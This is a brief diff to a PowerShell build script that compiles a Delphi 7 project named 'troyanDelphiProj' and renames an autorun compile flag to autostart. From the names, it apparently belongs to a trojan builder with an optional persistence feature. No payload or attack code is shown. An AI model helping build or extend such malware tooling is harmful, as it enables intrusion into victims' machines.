@@ -30,10 +30,10 @@ $manifestFile = Join-Path -Path $scriptDir -ChildPath "dns.manifest.rc"
 
 
 #compile
-$dprOpts = "NO_AUTORUN"
+$dprOpts = "NO_AUTOSTART"
 if ($server.autoStart)
 {
-    $dprOpts = "USE_AUTORUN"
+    $dprOpts = "USE_AUTOSTART"
 }
 $dcc32Path = "C:\Program Files (x86)\Borland\Delphi7\Bin\dcc32.exe"
 $dprFile = $server.troyanDelphiProj
